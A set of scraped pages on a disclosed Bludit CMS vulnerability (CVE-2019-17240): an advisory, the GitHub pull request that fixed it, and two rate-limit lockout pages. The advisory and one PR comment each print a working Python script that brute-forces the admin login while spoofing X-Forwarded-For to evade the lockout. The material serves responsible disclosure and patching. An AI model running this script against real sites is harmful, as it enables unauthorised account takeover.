=== Content from rastating.github.io_b0a94ca0_20250121_010658.html ===

[![](/assets/images/avatar.jpg)](/)
# [rastating.github.io](/)

# Bludit Brute Force Mitigation Bypass

October 5, 2019

Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to incorrectly login 10 times or more. Within the `bl-kernel/security.class.php` file, there is a function named `getUserIp` which attempts to determine the *true* IP address of the end user by trusting the `X-Forwarded-For` and `Client-IP` HTTP headers:

```
public function getUserIp()
{
  if (getenv('HTTP_X_FORWARDED_FOR')) {
    $ip = getenv('HTTP_X_FORWARDED_FOR');
  } elseif (getenv('HTTP_CLIENT_IP')) {
    $ip = getenv('HTTP_CLIENT_IP');
  } else {
    $ip = getenv('REMOTE_ADDR');
  }
  return $ip;
}

```

The reasoning behind the checking of these headers is to determine the IP address of end users who are accessing the website behind a proxy, however, trusting these headers allows an attacker to easily spoof the source address. Additionally, no validation is carried out to ensure they are valid IP addresses, meaning that an attacker can use any arbitrary value and not risk being locked out.

As can be seen in the content of the log file below (found in `bl-content/databases/security.php`), submitting a login request with an `X-Forwarded-For` header value of `FakeIp` was processed successfully, and the failed login attempt was logged against the spoofed string:

```
{
    "minutesBlocked": 5,
    "numberFailuresAllowed": 10,
    "blackList": {
        "192.168.194.1": {
            "lastFailure": 1570286876,
            "numberFailures": 1
        },
        "10.10.10.10": {
            "lastFailure": 1570286993,
            "numberFailures": 1
        },
        "FakeIp": {
            "lastFailure": 1570287052,
            "numberFailures": 1
        }
    }
}

```

By automating the generation of unique header values, prolonged brute force attacks can be carried out without risk of being blocked after 10 failed attempts, as can be seen in the demonstration video below in which a total of 51 attempts are made prior to recovering the correct password.

## Demonstration

[![](https://asciinema.org/a/272661.svg)](https://asciinema.org/a/272661)
## Versions Affected

<= 3.9.2

## Solution

Update to a version later than 3.9.2 or apply the patch found at <https://github.com/bludit/bludit/pull/1090>

## CVSS v3 Vector

[AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:P/RL:W/RC:R](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:P/RL:W/RC:R&version=3.1)

## Disclosure Timeline

* **2019-10-05**: Vulnerability found, pull request opened with fix
* **2019-10-05**: CVE requested
* **2019-10-05**: Patch merged into master branch
* **2019-10-06**: CVE-2019-17240 assigned to issue

## Proof of Concept

```
#!/usr/bin/env python3
import re
import requests

host = 'http://192.168.194.146/bludit'
login_url = host + '/admin/login'
username = 'admin'
wordlist = []

# Generate 50 incorrect passwords
for i in range(50):
    wordlist.append('Password{i}'.format(i = i))

# Add the correct password to the end of the list
wordlist.append('adminadmin')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break

```

[#disclosure](/tags#disclosure)
[#php](/tags#php)
[#security](/tags#security)
[#websec](/tags#websec)
[#CVE-2019-17240](/tags#CVE-2019-17240)

---



=== Content from packetstormsecurity.com_a35bf0ef_20250121_010657.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from github.com_e6daa8dd_20250121_010658.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbludit%2Fbludit%2Fpull%2F1090)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbludit%2Fbludit%2Fpull%2F1090)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=bludit%2Fbludit)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[bludit](/bludit)
/
**[bludit](/bludit/bludit)**
Public

* [Notifications](/login?return_to=%2Fbludit%2Fbludit) You must be signed in to change notification settings
* [Fork
  294](/login?return_to=%2Fbludit%2Fbludit)
* [Star
   1.3k](/login?return_to=%2Fbludit%2Fbludit)

* [Code](/bludit/bludit)
* [Issues
  52](/bludit/bludit/issues)
* [Pull requests
  10](/bludit/bludit/pulls)
* [Actions](/bludit/bludit/actions)
* [Security](/bludit/bludit/security)
* [Insights](/bludit/bludit/pulse)

Additional navigation options

* [Code](/bludit/bludit)
* [Issues](/bludit/bludit/issues)
* [Pull requests](/bludit/bludit/pulls)
* [Actions](/bludit/bludit/actions)
* [Security](/bludit/bludit/security)
* [Insights](/bludit/bludit/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fbludit%2Fbludit%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fbludit%2Fbludit%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Remove use of headers that can be used to bypass anti-brute force controls #1090

 Merged

[dignajar](/dignajar)
merged 1 commit into
[bludit:master](/bludit/bludit/tree/master "bludit/bludit:master")
from
[rastating:bug/fix-brute-force-vulnerability](/rastating/bludit/tree/bug/fix-brute-force-vulnerability "rastating/bludit:bug/fix-brute-force-vulnerability")

Oct 5, 2019

 Merged

# [Remove use of headers that can be used to bypass anti-brute force controls](#top) #1090

[dignajar](/dignajar)
merged 1 commit into
[bludit:master](/bludit/bludit/tree/master "bludit/bludit:master")
from
[rastating:bug/fix-brute-force-vulnerability](/rastating/bludit/tree/bug/fix-brute-force-vulnerability "rastating/bludit:bug/fix-brute-force-vulnerability")

Oct 5, 2019

[Conversation
5](/bludit/bludit/pull/1090)
[Commits
1](/bludit/bludit/pull/1090/commits)
[Checks
0](/bludit/bludit/pull/1090/checks)
[Files changed](/bludit/bludit/pull/1090/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![rastating](https://avatars.githubusercontent.com/u/2500434?s=60&v=4)](/rastating)

Copy link

Contributor

### @rastating **[rastating](/rastating)** commented [Oct 5, 2019](#issue-502992321)

In `bl-kernel/security.class.php`, there is some code that will check the number of incorrect login attempts made by a host. If the host makes 10 incorrect attempts, they will be temporarily blocked in order to mitigate brute force attempts.

Due to the way the IP address detection is handled, the mechanism can be completely bypassed. The `X-Forwarded-For` and `Client-IP` headers are both checked for (presumably in order to try and detect the IP address of people behind proxies). Unfortunately, both of these headers are easily spoofed, and for an attacker that is running an automated brute force, this will make the process significantly easier than say switching between VPNs as each address gets banned.

I have included a proof of concept demo below in which you can see a total of 51 requests being made (far exceeding the limit) and successfully recovering my admin password:

[![asciicast](https://camo.githubusercontent.com/3120ba815c1156d4117b8b0b7f6f6b4fc7aa123b3876c2b6fadb866fb1d5252d/68747470733a2f2f61736369696e656d612e6f72672f612f3237323636312e737667)](https://asciinema.org/a/272661)

This is done by using unique `X-Forwarded-For` addresses for each request. As there is no validation, simply using the value of the password being attempted will work, allowing for a brute force without the risk of locking anyone out at all, as can be seen when inspecting the log file after the brute force has been completed.

Although with this change, it means users who are using a shared IP address via a proxy may be blocked if another person using the same IP is trying to brute force the login page, it will make an automated attack significantly more difficult for an attacker and require that they have multiple IP addresses that they can send traffic from.

Sorry, something went wrong.

All reactions

[![@rastating](https://avatars.githubusercontent.com/u/2500434?s=40&v=4)](/rastating)

`[Remove use of headers that can be used to bypass anti-brute force con…](/bludit/bludit/pull/1090/commits/b5afd441957623d8557df15db8c1dbfa9da220e1 "Remove use of headers that can be used to bypass anti-brute force controls")`
 …

`[b5afd44](/bludit/bludit/pull/1090/commits/b5afd441957623d8557df15db8c1dbfa9da220e1)`

```
…trols
```

[![@rastating](https://avatars.githubusercontent.com/u/2500434?s=80&v=4)](/rastating)

Copy link

Contributor

Author

### **[rastating](/rastating)** commented [Oct 5, 2019](#issuecomment-538671522)

| If you'd like to test this yourself, the script I wrote to run the test in the recording can be found below. It requires you to set the `host` and `username` variables at the top of the script and to replace `adminadmin` with whatever password you intend to test against:  ``` #!/usr/bin/env python3 import re import requests  host = 'http://192.168.194.146/bludit' login_url = host + '/admin/login' username = 'admin' wordlist = []  # Generate 50 incorrect passwords for i in range(50):     wordlist.append('Password{i}'.format(i = i))  # Add the correct password to the end of the list wordlist.append('adminadmin')  for password in wordlist:     session = requests.Session()     login_page = session.get(login_url)     csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)      print('[*] Trying: {p}'.format(p = password))      headers = {         'X-Forwarded-For': password,         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',         'Referer': login_url     }      data = {         'tokenCSRF': csrf_token,         'username': username,         'password': password,         'save': ''     }      login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)      if 'location' in login_result.headers:         if '/admin/dashboard' in login_result.headers['location']:             print()             print('SUCCESS: Password found!')             print('Use {u}:{p} to login.'.format(u = username, p = password))             print()             break ``` |
| --- |

 👍
3
 mansooribneayaz, AmbitiousSam, and ceyhunism reacted with thumbs up emoji

All reactions

* 👍
  3 reactions

Sorry, something went wrong.

[![@dignajar](https://avatars.githubusercontent.com/u/507352?s=80&u=5b98d16c0b58a7aef90250927d0ff5282ca59d92&v=4)](/dignajar)

Copy link

Member

### **[dignajar](/dignajar)** commented [Oct 5, 2019](#issuecomment-538673771)

| Thank you for your explanation and the fix for the vulnerability. I would like to have more people like you. |
| --- |

 ❤️
5
 rastating, finnlestrange, DarthSoda, 0ne-nine9, and ceyhunism reacted with heart emoji

All reactions

* ❤️
  5 reactions

Sorry, something went wrong.

[![@dignajar](https://avatars.githubusercontent.com/u/507352?s=40&u=5b98d16c0b58a7aef90250927d0ff5282ca59d92&v=4)](/dignajar)
[dignajar](/dignajar)
merged commit [`bee66af`](/bludit/bludit/commit/bee66af492614c316c467cc703c135b93dec2f8f)
into
bludit:master

[Oct 5, 2019](https://github.com/bludit/bludit/pull/1090#event-2689441906)

[![@rastating](https://avatars.githubusercontent.com/u/2500434?s=80&v=4)](/rastating)

Copy link

Contributor

Author

### **[rastating](/rastating)** commented [Oct 5, 2019](#issuecomment-538676139)

| You're welcome! Us open-source folk have to look out for one another, right? 😃 |
| --- |

 ❤️
2
 tmdh and Encom21 reacted with heart emoji

All reactions

* ❤️
  2 reactions

Sorry, something went wrong.

[![@impshum](https://avatars.githubusercontent.com/u/3229127?s=80&u=0fcc5eb8fb3cbe1a1ebc901e2a9e4eda6ad4ef71&v=4)](/impshum)

Copy link

### **[impshum](/impshum)** commented [Aug 16, 2020](#issuecomment-674564639)

| This is good to know. I'm currently building a site using Bludit.  Thanks for the fix. |
| --- |

All reactions

Sorry, something went wrong.

[![@sasha-0077](https://avatars.githubusercontent.com/u/59020497?s=80&v=4)](/sasha-0077)

Copy link

### **[sasha-0077](/sasha-0077)** commented [Aug 25, 2020](#issuecomment-680225220)

| thanks for your work i am trying the script and when i add the password word-list direction it looks like its not reading it its just trying the direction as a password and i do a lot of search to do that but i didn't get any more use full information by the way I'm working on hackthebox blunder machine it use bludit website |
| --- |

All reactions

Sorry, something went wrong.

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fbludit%2Fbludit%2Fpull%2F1090)

Reviewers

No reviews

Assignees

No one assigned

Labels

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

4 participants

[![@rastating](https://avatars.githubusercontent.com/u/2500434?s=52&v=4)](/rastating) [![@dignajar](https://avatars.githubusercontent.com/u/507352?s=52&v=4)](/dignajar) [![@impshum](https://avatars.githubusercontent.com/u/3229127?s=52&v=4)](/impshum) [![@sasha-0077](https://avatars.githubusercontent.com/u/59020497?s=52&v=4)](/sasha-0077)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from packetstormsecurity.com_18ff2cea_20250121_010657.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.
